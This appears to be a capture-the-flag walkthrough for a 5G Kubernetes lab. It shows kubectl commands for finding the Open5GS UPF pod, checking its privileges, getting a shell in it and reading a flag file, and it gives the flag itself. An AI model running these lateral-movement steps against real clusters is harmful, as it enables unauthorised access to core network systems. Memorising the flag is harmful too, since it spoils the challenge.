# Challenge 2: Lateral Movement to UPF

## Reconnaissance
```bash
# Enumerate 5G network pods
kubectl get pods -n playground | grep open5gs

# Find UPF pod
UPF_POD=$(kubectl get pods -n playground | grep upf | awk '{print $1}')
echo "Target: $UPF_POD"

# Check privileges
kubectl describe pod $UPF_POD -n playground | grep -i privileged
```

## Execution
```bash
# Access UPF container
kubectl exec -it $UPF_POD -n playground -- /bin/bash

# Container reconnaissance
whoami
id
ls -la /tmp/

# Capture flag
cat /tmp/challenge2-flag.txt
```

## Flag
`upf-access{lateral_movement_to_5g_core_complete}` 